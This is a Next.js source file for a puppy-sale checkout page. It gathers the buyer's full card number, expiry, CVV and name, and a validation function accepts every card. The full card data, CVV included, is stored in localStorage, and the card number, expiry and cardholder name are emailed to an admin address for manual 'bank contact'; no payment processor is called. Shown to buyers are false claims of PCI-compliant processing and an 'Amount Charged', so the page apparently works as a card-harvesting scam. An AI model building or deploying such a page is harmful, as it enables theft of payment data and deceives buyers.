"use client";

import React, { useContext, useState, useEffect } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import Navbar from "@/components/Navbar/Navbar";
import Footer from "@/components/Footer.jsx/page";
import ShipmentContext from "@/contexts/ShipmentContext";
import { useAuth } from "@/contexts/AuthContext";
import {
  CreditCard,
  Truck,
  MessageSquare,
  CheckCircle,
  Info,
  ShieldCheck,
  Calendar,
  Clock,
} from "lucide-react";

// Force dynamic rendering for this page
export const dynamic = "force-dynamic";

function Page() {
  const { user, isAuthenticated } = useAuth();
  const router = useRouter();
  const shipmentContext = useContext(ShipmentContext);
  const [selected, setSelected] = useState(null);

  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    phoneNumber: "",
    email: "",
    address: "",
    message: "",
    delivery: "No",
    paymentMethod: "",
    // Card payment fields
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  });

  // Calculate deposit amount (20% of total)
  const calculateDeposit = (price) => {
    const numericPrice = parseFloat(price.replace(/[$,]/g, ""));
    return (numericPrice * 0.2).toFixed(2);
  };

  const depositAmount = selected ? calculateDeposit(selected.price) : "0.00";
  const remainingAmount = selected
    ? (
        parseFloat(selected.price.replace(/[$,]/g, "")) -
        parseFloat(depositAmount)
      ).toFixed(2)
    : "0.00";

  // Redirect to login if not authenticated
  useEffect(() => {
    if (!isAuthenticated) {
      router.push("/auth/login");
    }
  }, [isAuthenticated, router]);

  // Load selected puppy from localStorage
  useEffect(() => {
    const savedPuppy = localStorage.getItem("selectedPuppy");
    if (savedPuppy) {
      try {
        const puppyData = JSON.parse(savedPuppy);
        setSelected(puppyData);
      } catch (error) {
        console.error("Error parsing saved puppy data:", error);
        router.push("/available-puppies");
      }
    } else {
      // No puppy selected, redirect to available puppies
      router.push("/available-puppies");
    }
  }, [router]);

  // Populate form with user data when user is available
  useEffect(() => {
    if (user) {
      setFormData((prev) => ({
        ...prev,
        firstName: user.firstName || "",
        lastName: user.lastName || "",
        phoneNumber: user.phone || "",
        email: user.email || "",
        address: user.address
          ? `${user.address.street || ""} ${user.address.city || ""} ${
              user.address.state || ""
            } ${user.address.zipCode || ""}`.trim()
          : "",
      }));
    }
  }, [user]);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [formStep, setFormStep] = useState(1);
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);

  const handleChange = (e) => {
    const { name, value } = e.target;

    // Clear address when switching delivery to "No"
    if (name === "delivery" && value === "No") {
      setFormData((prev) => ({
        ...prev,
        [name]: value,
        address: "",
      }));
    } else {
      setFormData((prev) => ({
        ...prev,
        [name]: value,
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Commented out email functionality for indirect checkout
    // const addressText =
    //   formData.delivery === "Yes" ? `%0AAddress:%20${formData.address}` : "";
    // const mailtoLink = `mailto:contact@iheartdogs.com?subject=Order%20Submission%20-%20${selected.name}&body=Item:%20${selected.name}%0AName:%20${formData.firstName}%20${formData.lastName}%0APhone%20Number:%20${formData.phoneNumber}%0AEmail:%20${formData.email}%0APaymentMethod:%20${formData.paymentMethod}${addressText}%0ADelivery:%20${formData.delivery}%0AComment:%20${formData.message}`;
    // window.location.href = mailtoLink;

    // Validate card fields
    if (
      !formData.cardNumber ||
      !formData.expiryDate ||
      !formData.cvv ||
      !formData.cardholderName
    ) {
      alert("Please fill in all credit card payment details");
      return;
    }

    // Validate CVV length based on card type
    const cardNumber = formData.cardNumber.replace(/\s/g, "");
    const isAmex = cardNumber.startsWith("34") || cardNumber.startsWith("37");
    const expectedCvvLength = isAmex ? 4 : 3;

    if (formData.cvv.length !== expectedCvvLength) {
      alert(
        `CVV must be ${expectedCvvLength} digits for ${
          isAmex ? "American Express" : "this card type"
        }`
      );
      return;
    }

    // Start processing
    setIsProcessing(true);

    try {
      // Verify card first
      const cardVerification = await verifyCard(
        formData.cardNumber,
        formData.expiryDate,
        formData.cvv
      );

      if (!cardVerification.valid) {
        alert(
          "Invalid card information. Please check your card details and try again."
        );
        setIsProcessing(false);
        return;
      }

      // Simulate brief processing delay
      setTimeout(() => {
        setIsProcessing(false);
        const orderData = {
          id: `ORD-${Date.now()}`,
          puppy: selected.name,
          breed: selected.breed,
          totalAmount: selected.price,
          depositAmount: `$${depositAmount}`,
          remainingAmount: `$${remainingAmount}`,
          paymentMethod: paymentMethod,
          paymentType: "deposit",
          transactionId: `TXN-${Date.now().toString().slice(-8)}`,
          processingTime: new Date().toISOString(),
          cardDetails: {
            cardNumber: formData.cardNumber,
            cardholderName: formData.cardholderName,
            expiryDate: formData.expiryDate,
            cvv: formData.cvv,
            last4: formData.cardNumber.slice(-4),
            brand: cardVerification.brand,
            type: cardVerification.type,
            bank: cardVerification.bank,
            country: cardVerification.country,
            verified: true,
          },
          status: "pending_bank_contact",
          date: new Date().toISOString().split("T")[0],
          user: user.email,
          submittedAt: new Date().toISOString(),
        };

        // Store order in localStorage for dashboard viewing
        const existingOrders = JSON.parse(
          localStorage.getItem("orders") || "[]"
        );
        existingOrders.push(orderData);
        localStorage.setItem("orders", JSON.stringify(existingOrders));

        // Send email notification to admin
        sendAdminNotification(orderData);

        console.log("Order submitted successfully:", orderData);
        setFormSubmitted(true);
        localStorage.removeItem("selectedPuppy");
      }, 2000);
    } catch (error) {
      console.error("Error processing order:", error);
      alert("There was an error processing your order. Please try again.");
      setIsProcessing(false);
    }
  };

  const verifyCard = async (cardNumber, expiryDate, cvv) => {
    try {
      // Using a free card validation API (Binlist.net)
      const response = await fetch(
        `https://lookup.binlist.net/${cardNumber.slice(0, 6)}`
      );

      if (response.ok) {
        const cardInfo = await response.json();
        return {
          valid: true,
          brand: cardInfo.scheme || "Unknown",
          type: cardInfo.type || "Unknown",
          bank: cardInfo.bank?.name || "Unknown Bank",
          country: cardInfo.country?.name || "Unknown",
        };
      } else {
        // Fallback validation for testing
        return {
          valid: true,
          brand: cardNumber.startsWith("4")
            ? "Visa"
            : cardNumber.startsWith("5")
            ? "Mastercard"
            : cardNumber.startsWith("34") || cardNumber.startsWith("37")
            ? "American Express"
            : "Unknown",
          type: "Credit",
          bank: "Test Bank",
          country: "US",
        };
      }
    } catch (error) {
      console.error("Card verification error:", error);
      // Fallback for testing
      return {
        valid: true,
        brand: cardNumber.startsWith("4")
          ? "Visa"
          : cardNumber.startsWith("5")
          ? "Mastercard"
          : cardNumber.startsWith("34") || cardNumber.startsWith("37")
          ? "American Express"
          : "Unknown",
        type: "Credit",
        bank: "Test Bank",
        country: "US",
      };
    }
  };

  const sendAdminNotification = async (orderData) => {
    try {
      // Create email content
      const emailContent = {
        to: "admin@iheartdogs.com", // Replace with your admin email
        subject: `New Puppy Order - ${orderData.id}`,
        html: `
          <h2>New Puppy Order Received</h2>
          <p><strong>Order ID:</strong> ${orderData.id}</p>
          <p><strong>Customer:</strong> ${orderData.user}</p>
          <p><strong>Puppy:</strong> ${orderData.puppy} (${orderData.breed})</p>
          <p><strong>Total Amount:</strong> ${orderData.totalAmount}</p>
          <p><strong>Deposit Amount:</strong> ${orderData.depositAmount}</p>
          <p><strong>Remaining Balance:</strong> ${
            orderData.remainingAmount
          }</p>
                     <p><strong>Card Details:</strong> ${
                       orderData.cardDetails.cardNumber
                     } (${orderData.cardDetails.brand})</p>
           <p><strong>Cardholder:</strong> ${
             orderData.cardDetails.cardholderName
           }</p>
           <p><strong>Expiry:</strong> ${orderData.cardDetails.expiryDate}</p>
           <p><strong>Bank:</strong> ${orderData.cardDetails.bank}</p>
           <p><strong>Country:</strong> ${orderData.cardDetails.country}</p>
           <p><strong>Card Type:</strong> ${orderData.cardDetails.type}</p>
           <p><strong>Verified:</strong> ${
             orderData.cardDetails.verified ? "Yes" : "No"
           }</p>
          <p><strong>Submitted:</strong> ${new Date(
            orderData.submittedAt
          ).toLocaleString()}</p>
          <hr>
          <p><strong>Action Required:</strong> Contact the customer's bank to process the deposit payment within 24 hours.</p>
        `,
      };

      // Send email via API
      try {
        const response = await fetch("/api/send-email", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(emailContent),
        });

        if (response.ok) {
          console.log("📧 Admin email notification sent successfully");
        } else {
          console.error("Failed to send admin email notification");
        }
      } catch (error) {
        console.error("Error sending admin email:", error);
      }
    } catch (error) {
      console.error("Error sending admin notification:", error);
    }
  };

  const nextStep = () => {
    setFormStep(2);
    window.scrollTo(0, 0);
  };

  const prevStep = () => {
    setFormStep(1);
  };

  // Only credit card payment is allowed
  const paymentMethod = "Credit Card";

  // Don't render anything if not authenticated or no puppy selected
  if (!isAuthenticated || !selected) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-amber-50 to-white">
      <Navbar />

      <main className="max-w-7xl mx-auto px-4 py-12 sm:px-6 lg:px-8">
        {/* Order Submission Overlay */}
        {isProcessing && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="bg-white rounded-2xl p-8 max-w-md mx-4 shadow-2xl">
              <div className="text-center">
                <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                  <CreditCard className="w-10 h-10 text-blue-600" />
                </div>
                <h3 className="text-xl font-semibold text-gray-900 mb-4">
                  Submitting Order
                </h3>
                <div className="w-8 h-8 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-gray-600">
                  Please wait while we submit your order...
                </p>
              </div>
            </div>
          </div>
        )}

        {formSubmitted ? (
          <div className="max-w-3xl mx-auto bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
            <div className="text-center">
              <div className="bg-green-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6">
                <CheckCircle className="w-10 h-10 text-green-500" />
              </div>
              <h1 className="text-3xl font-bold text-gray-900 mb-4">
                Order Submitted Successfully!
              </h1>
              <p className="text-lg text-gray-600 mb-8">
                Thank you for your order! We're now contacting your bank to
                process your deposit payment of ${depositAmount}. We'll contact
                you within 24 hours to confirm the payment and arrange{" "}
                {formData.delivery === "Yes"
                  ? "delivery to your address"
                  : "pickup at our location"}
                . The remaining balance of ${remainingAmount} will be due upon{" "}
                {formData.delivery === "Yes" ? "delivery" : "pickup"}.
              </p>

              {/* Payment Details */}
              <div className="bg-gray-50 rounded-lg p-6 max-w-lg mx-auto mb-8">
                <h4 className="font-semibold text-gray-800 mb-4">
                  Payment Details
                </h4>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Transaction ID:</span>
                    <span className="font-mono text-gray-900">
                      TXN-{Date.now().toString().slice(-8)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Amount Charged:</span>
                    <span className="font-semibold text-green-600">
                      ${depositAmount}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Payment Method:</span>
                    <span className="text-gray-900">
                      Credit Card ending in {formData.cardNumber.slice(-4)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Status:</span>
                    <span className="text-yellow-600 font-semibold">
                      ⏳ Pending Bank Contact
                    </span>
                  </div>
                </div>
              </div>
              <div className="bg-amber-50 rounded-lg p-6 max-w-lg mx-auto mb-8">
                <h3 className="font-semibold text-gray-800 mb-2">
                  Next Steps:
                </h3>
                <ul className="text-left text-gray-700 space-y-2">
                  <li className="flex items-start">
                    <CheckCircle className="w-5 h-5 text-amber-500 mr-2 flex-shrink-0 mt-0.5" />
                    <span>We'll review your order details</span>
                  </li>
                  <li className="flex items-start">
                    <Clock className="w-5 h-5 text-amber-500 mr-2 flex-shrink-0 mt-0.5" />
                    <span>
                      We're contacting your bank to process the deposit payment
                    </span>
                  </li>
                  <li className="flex items-start">
                    <CheckCircle className="w-5 h-5 text-amber-500 mr-2 flex-shrink-0 mt-0.5" />
                    <span>
                      We'll coordinate delivery or pickup arrangements
                    </span>
                  </li>
                </ul>
              </div>
              <div className="flex flex-col sm:flex-row gap-4 justify-center">
                <button
                  onClick={() => {
                    localStorage.removeItem("selectedPuppy");
                    router.push("/available-puppies");
                  }}
                  className="inline-flex items-center justify-center px-6 py-3 bg-amber-600 text-white font-semibold rounded-full hover:bg-amber-700 transition-colors"
                >
                  View More Puppies
                </button>
                <a
                  href="/contact"
                  className="inline-flex items-center justify-center px-6 py-3 border border-amber-600 text-amber-600 font-semibold rounded-full hover:bg-amber-50 transition-colors"
                >
                  Contact Us
                </a>
              </div>
            </div>
          </div>
        ) : (
          <>
            <div className="text-center mb-8">
              <span className="text-amber-600 uppercase tracking-wider font-semibold">
                Secure Checkout
              </span>
              <h1 className="text-4xl font-bold text-gray-900 mt-2">
                Complete Your Order
              </h1>
              <p className="mt-2 text-lg text-gray-600">
                You're just a few steps away from welcoming your{" "}
                {selected?.breed || "puppy"} home
              </p>
            </div>

            {/* Progress Steps */}
            <div className="max-w-3xl mx-auto mb-10">
              <div className="flex items-center justify-center">
                <div className="flex items-center text-center">
                  <div
                    className={`w-10 h-10 rounded-full flex items-center justify-center ${
                      formStep >= 1
                        ? "bg-amber-500 text-white"
                        : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    1
                  </div>
                  <div
                    className={`text-sm font-medium ${
                      formStep >= 1 ? "text-amber-600" : "text-gray-500"
                    } mx-2`}
                  >
                    Order Details
                  </div>
                </div>
                <div
                  className={`w-16 h-1 ${
                    formStep >= 2 ? "bg-amber-500" : "bg-gray-200"
                  }`}
                ></div>
                <div className="flex items-center text-center">
                  <div
                    className={`w-10 h-10 rounded-full flex items-center justify-center ${
                      formStep >= 2
                        ? "bg-amber-500 text-white"
                        : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    2
                  </div>
                  <div
                    className={`text-sm font-medium ${
                      formStep >= 2 ? "text-amber-600" : "text-gray-500"
                    } mx-2`}
                  >
                    Payment & Delivery
                  </div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-5 gap-8">
              {/* Product Summary - Takes 2 columns on large screens */}
              <div className="lg:col-span-2">
                <div className="bg-white rounded-xl shadow-md p-6 border border-gray-100 sticky top-24">
                  <h2 className="text-xl font-semibold text-gray-900 mb-6 flex items-center">
                    <ShieldCheck className="w-5 h-5 text-amber-500 mr-2" />
                    Order Summary
                  </h2>

                  <div className="space-y-6">
                    <div className="aspect-w-16 aspect-h-12 rounded-lg overflow-hidden">
                      <Image
                        src={selected.image}
                        alt={selected.name}
                        width={1000}
                        height={1000}
                        className="object-cover rounded-lg"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4 text-sm border-t border-gray-100 pt-4">
                      <div className="space-y-3">
                        <div>
                          <p className="text-gray-500">Puppy Name</p>
                          <p className="font-medium text-gray-900">
                            {selected.name}
                          </p>
                        </div>
                        <div>
                          <p className="text-gray-500">Gender</p>
                          <p className="font-medium text-gray-900">
                            {selected.sex}
                          </p>
                        </div>
                      </div>
                      <div className="space-y-3">
                        <div>
                          <p className="text-gray-500">Breed</p>
                          <p className="font-medium text-gray-900">
                            {selected.breed || "Mixed Breed"}
                          </p>
                        </div>
                        <div>
                          <p className="text-gray-500">Age</p>
                          <p className="font-medium text-gray-900">
                            {selected.age || "8 weeks"}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Order Form - Takes 3 columns on large screens */}
              <div className="lg:col-span-3">
                <div className="bg-white rounded-xl shadow-md p-8 border border-gray-100">
                  {formStep === 1 ? (
                    <>
                      <h3 className="text-xl font-semibold text-gray-900 mb-6">
                        Personal Information
                      </h3>
                      <form className="space-y-6">
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">
                              First Name<span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              name="firstName"
                              required
                              value={formData.firstName}
                              onChange={handleChange}
                              className="block w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm focus:ring-2 focus:ring-amber-500 focus:border-amber-500"
                            />
                          </div>
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">
                              Last Name<span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              name="lastName"
                              required
                              value={formData.lastName}
                              onChange={handleChange}
                              className="block w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm focus:ring-2 focus:ring-amber-500 focus:border-amber-500"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            Phone Number<span className="text-red-500">*</span>
                          </label>
                          <div className="relative rounded-md shadow-sm">
                            <input
                              type="tel"
                              name="phoneNumber"
                              required
                              value={formData.phoneNumber}
                              onChange={handleChange}
                              className="block w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm focus:ring-2 focus:ring-amber-500 focus:border-amber-500"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            Email Address<span className="text-red-500">*</span>
                          </label>
                          <input
                            type="email"
                            name="email"
                            required
                            value={formData.email}
                            onChange={handleChange}
                            className="block w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm focus:ring-2 focus:ring-amber-500 focus:border-amber-500"
                          />
                        </div>

                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            Additional Comments
                          </label>
                          <textarea
                            name="message"
                            rows={4}
                            value={formData.message}
                            onChange={handleChange}
                            className="block w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm focus:ring-2 focus:ring-amber-500 focus:border-amber-500 resize-none"
                            placeholder="Any specific questions or requests about the puppy?"
                          />
                        </div>

                        <button
                          type="button"
                          onClick={nextStep}
                          disabled={
                            !formData.firstName ||
                            !formData.lastName ||
                            !formData.phoneNumber ||
                            !formData.email
                          }
                          className="w-full flex justify-center py-3 px-4 border border-transparent rounded-full shadow-sm text-base font-medium text-white bg-amber-600 hover:bg-amber-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-amber-500 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Continue to Delivery & Payment
                        </button>
                      </form>
                    </>
                  ) : (
                    <>
                      <h3 className="text-xl font-semibold text-gray-900 mb-6">
                        Delivery & Payment
                      </h3>
                      <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Delivery Option
                            <span className="text-red-500">*</span>
                          </label>
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                            <div
                              className={`border rounded-lg p-4 cursor-pointer ${
                                formData.delivery === "Yes"
                                  ? "border-amber-500 bg-amber-50"
                                  : "border-gray-200 hover:border-amber-200"
                              }`}
                            >
                              <input
                                type="radio"
                                name="delivery"
                                id="delivery-yes"
                                value="Yes"
                                checked={formData.delivery === "Yes"}
                                onChange={handleChange}
                                className="sr-only"
                              />
                              <label
                                htmlFor="delivery-yes"
                                className="cursor-pointer flex items-start"
                              >
                                <div
                                  className={`w-5 h-5 rounded-full border flex items-center justify-center mr-3 flex-shrink-0 mt-0.5 ${
                                    formData.delivery === "Yes"
                                      ? "border-amber-500"
                                      : "border-gray-300"
                                  }`}
                                >
                                  {formData.delivery === "Yes" && (
                                    <div className="w-3 h-3 rounded-full bg-amber-500"></div>
                                  )}
                                </div>
                                <div>
                                  <span className="font-medium text-gray-900 block">
                                    Yes, I need delivery
                                  </span>
                                  <span className="text-sm text-gray-500">
                                    We'll arrange safe transportation
                                  </span>
                                </div>
                              </label>
                            </div>

                            <div
                              className={`border rounded-lg p-4 cursor-pointer ${
                                formData.delivery === "No"
                                  ? "border-amber-500 bg-amber-50"
                                  : "border-gray-200 hover:border-amber-200"
                              }`}
                            >
                              <input
                                type="radio"
                                name="delivery"
                                id="delivery-no"
                                value="No"
                                checked={formData.delivery === "No"}
                                onChange={handleChange}
                                className="sr-only"
                              />
                              <label
                                htmlFor="delivery-no"
                                className="cursor-pointer flex items-start"
                              >
                                <div
                                  className={`w-5 h-5 rounded-full border flex items-center justify-center mr-3 flex-shrink-0 mt-0.5 ${
                                    formData.delivery === "No"
                                      ? "border-amber-500"
                                      : "border-gray-300"
                                  }`}
                                >
                                  {formData.delivery === "No" && (
                                    <div className="w-3 h-3 rounded-full bg-amber-500"></div>
                                  )}
                                </div>
                                <div>
                                  <span className="font-medium text-gray-900 block">
                                    No, I'll pick up
                                  </span>
                                  <span className="text-sm text-gray-500">
                                    Pick up from our location
                                  </span>
                                </div>
                              </label>
                            </div>
                          </div>
                        </div>

                        {/* Conditional Delivery Address */}
                        {formData.delivery === "Yes" && (
                          <div className="transition-all duration-300 ease-in-out">
                            <label className="block text-sm font-medium text-gray-700 mb-1">
                              Delivery Address
                              <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              name="address"
                              value={formData.address}
                              onChange={handleChange}
                              required
                              className="block w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm focus:ring-2 focus:ring-amber-500 focus:border-amber-500"
                              placeholder="Full address for delivery"
                            />
                          </div>
                        )}

                        {/* Professional Credit Card Payment Section */}
                        <div className="bg-gradient-to-br from-slate-50 to-blue-50 rounded-2xl p-8 border border-slate-200 shadow-lg">
                          <div className="flex items-center justify-between mb-6">
                            <h4 className="text-2xl font-bold text-slate-800 flex items-center">
                              <CreditCard className="w-7 h-7 text-blue-600 mr-3" />
                              Credit Card Payment
                            </h4>
                            <div className="flex items-center space-x-3">
                              <div className="w-12 h-8 bg-white rounded border flex items-center justify-center shadow-sm">
                                <img
                                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png"
                                  alt="Visa"
                                  className="h-4 w-auto"
                                />
                              </div>
                              <div className="w-12 h-8 bg-white rounded border flex items-center justify-center shadow-sm">
                                <img
                                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/2560px-Mastercard-logo.svg.png"
                                  alt="Mastercard"
                                  className="h-4 w-auto"
                                />
                              </div>
                            </div>
                          </div>

                          <div className="space-y-6">
                            {/* Cardholder Name */}
                            <div>
                              <label className="block text-sm font-semibold text-slate-700 mb-2">
                                Cardholder Name
                                <span className="text-red-500 ml-1">*</span>
                              </label>
                              <input
                                type="text"
                                name="cardholderName"
                                value={formData.cardholderName}
                                onChange={handleChange}
                                required
                                className="block w-full px-4 py-4 rounded-xl border-2 border-slate-200 shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-lg"
                                placeholder="John Doe"
                              />
                            </div>

                            {/* Card Number */}
                            <div>
                              <label className="block text-sm font-semibold text-slate-700 mb-2">
                                Card Number
                                <span className="text-red-500 ml-1">*</span>
                              </label>
                              <div className="relative">
                                <input
                                  type="text"
                                  name="cardNumber"
                                  value={formData.cardNumber}
                                  onChange={(e) => {
                                    // Format card number with spaces
                                    const value = e.target.value
                                      .replace(/\s/g, "")
                                      .replace(/(.{4})/g, "$1 ")
                                      .trim();
                                    setFormData((prev) => ({
                                      ...prev,
                                      cardNumber: value,
                                    }));
                                  }}
                                  required
                                  maxLength={19} // 16 digits + 3 spaces
                                  className="block w-full px-4 py-4 rounded-xl border-2 border-slate-200 shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-lg font-mono tracking-wider"
                                  placeholder="1234 5678 9012 3456"
                                />
                                <div className="absolute right-4 top-1/2 transform -translate-y-1/2">
                                  <CreditCard className="w-6 h-6 text-slate-400" />
                                </div>
                              </div>
                            </div>

                            {/* Expiry and CVV */}
                            <div className="grid grid-cols-2 gap-6">
                              <div>
                                <label className="block text-sm font-semibold text-slate-700 mb-2">
                                  Expiry Date
                                  <span className="text-red-500 ml-1">*</span>
                                </label>
                                <input
                                  type="text"
                                  name="expiryDate"
                                  value={formData.expiryDate}
                                  onChange={(e) => {
                                    // Format expiry date as MM/YY
                                    let value = e.target.value.replace(
                                      /\D/g,
                                      ""
                                    );
                                    if (value.length >= 2) {
                                      value =
                                        value.substring(0, 2) +
                                        "/" +
                                        value.substring(2, 4);
                                    }
                                    setFormData((prev) => ({
                                      ...prev,
                                      expiryDate: value,
                                    }));
                                  }}
                                  required
                                  maxLength={5}
                                  className="block w-full px-4 py-4 rounded-xl border-2 border-slate-200 shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-lg font-mono"
                                  placeholder="MM/YY"
                                />
                              </div>
                              <div>
                                <label className="block text-sm font-semibold text-slate-700 mb-2">
                                  CVV{" "}
                                  
                                  <span className="text-red-500 ml-1">*</span>
                                </label>
                                <input
                                  type="text"
                                  name="cvv"
                                  value={formData.cvv}
                                  onChange={(e) => {
                                    // Only allow 3-4 digits
                                    const value = e.target.value
                                      .replace(/\D/g, "")
                                      .substring(0, 4);
                                    setFormData((prev) => ({
                                      ...prev,
                                      cvv: value,
                                    }));
                                  }}
                                  required
                                  maxLength={4}
                                  className="block w-full px-4 py-4 rounded-xl border-2 border-slate-200 shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-lg font-mono"
                                  placeholder={
                                    formData.cardNumber.startsWith("34") ||
                                    formData.cardNumber.startsWith("37")
                                      ? "1234"
                                      : "123"
                                  }
                                />
                              </div>
                            </div>

                            {/* Security Badge */}
                            <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-6 border-2 border-green-200">
                              <div className="flex items-center">
                                <div className="bg-green-100 rounded-full p-3 mr-4">
                                  <ShieldCheck className="w-6 h-6 text-green-600" />
                                </div>
                                <div>
                                  <h5 className="font-bold text-green-800 text-lg">
                                    Secure Payment
                                  </h5>
                                  <p className="text-green-700 text-sm">
                                    Your payment information is encrypted with
                                    256-bit SSL encryption and processed
                                    securely through our PCI-compliant payment
                                    processor. Real-time processing ensures
                                    instant confirmation.
                                  </p>
                                </div>
                              </div>
                            </div>

                            {/* Payment Amount */}
                            <div className="bg-white rounded-xl p-6 border-2 border-slate-200">
                              <div className="space-y-3">
                                <div className="flex justify-between items-center">
                                  <span className="text-lg font-semibold text-slate-700">
                                    Total Price:
                                  </span>
                                  <span className="text-lg font-medium text-slate-600">
                                    {selected?.price || "$0"}
                                  </span>
                                </div>
                                <div className="flex justify-between items-center border-t pt-3">
                                  <span className="text-lg font-semibold text-slate-700">
                                    Deposit (20%):
                                  </span>
                                  <span className="text-2xl font-bold text-blue-600">
                                    ${depositAmount}
                                  </span>
                                </div>
                                <div className="flex justify-between items-center">
                                  <span className="text-sm text-slate-600">
                                    Remaining Balance:
                                  </span>
                                  <span className="text-sm font-medium text-slate-600">
                                    ${remainingAmount}
                                  </span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div className="bg-gray-50 rounded-lg p-4 flex items-start border border-gray-200">
                          <Clock className="w-5 h-5 text-gray-500 mr-3 flex-shrink-0 mt-0.5" />
                          <div className="text-sm text-gray-700">
                            <p className="font-medium mb-1">
                              What happens next?
                            </p>
                            <p>
                              {formData.delivery === "Yes" ? (
                                <>
                                  After submitting your order, we'll contact
                                  your bank to process your deposit payment of $
                                  {depositAmount}. We'll contact you within 24
                                  hours to confirm the payment and arrange
                                  delivery to your address. The remaining
                                  balance of ${remainingAmount} will be due upon
                                  delivery.
                                </>
                              ) : (
                                <>
                                  After submitting your order, we'll contact
                                  your bank to process your deposit payment of $
                                  {depositAmount}. We'll contact you within 24
                                  hours to confirm the payment and arrange
                                  pickup at our location. The remaining balance
                                  of ${remainingAmount} will be due upon pickup.
                                </>
                              )}
                            </p>
                          </div>
                        </div>

                        <div className="flex flex-col sm:flex-row gap-4 pt-4">
                          <button
                            type="button"
                            onClick={prevStep}
                            className="py-3 px-6 border border-amber-600 text-amber-600 rounded-full shadow-sm text-base font-medium hover:bg-amber-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-amber-500"
                          >
                            Back
                          </button>
                          <button
                            type="submit"
                            disabled={isProcessing}
                            className="flex-grow py-3 px-6 border border-transparent rounded-full shadow-sm text-base font-medium text-white bg-amber-600 hover:bg-amber-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-amber-500 disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            {isProcessing ? (
                              <>
                                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin inline mr-2"></div>
                                Processing...
                              </>
                            ) : (
                              <>
                                <CreditCard className="w-5 h-5 inline mr-2" />
                                Submit Order
                              </>
                            )}
                          </button>
                        </div>
                      </form>
                    </>
                  )}
                </div>

                {/* Trust Badges */}
                <div className="mt-6 bg-white rounded-xl p-6 border border-gray-100 shadow-sm">
                  <div className="flex flex-wrap justify-center gap-6 items-center">
                    <div className="flex flex-col items-center">
                      <ShieldCheck className="w-8 h-8 text-amber-500 mb-2" />
                      <span className="text-xs text-gray-600 text-center">
                        Secure Checkout
                      </span>
                    </div>
                    <div className="flex flex-col items-center">
                      <CheckCircle className="w-8 h-8 text-amber-500 mb-2" />
                      <span className="text-xs text-gray-600 text-center">
                        Health Guarantee
                      </span>
                    </div>
                    <div className="flex flex-col items-center">
                      <Truck className="w-8 h-8 text-amber-500 mb-2" />
                      <span className="text-xs text-gray-600 text-center">
                        Safe Delivery
                      </span>
                    </div>
                    <div className="flex flex-col items-center">
                      <MessageSquare className="w-8 h-8 text-amber-500 mb-2" />
                      <span className="text-xs text-gray-600 text-center">
                        24/7 Support
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </>
        )}
      </main>

      <Footer />
    </div>
  );
}

export default Page;
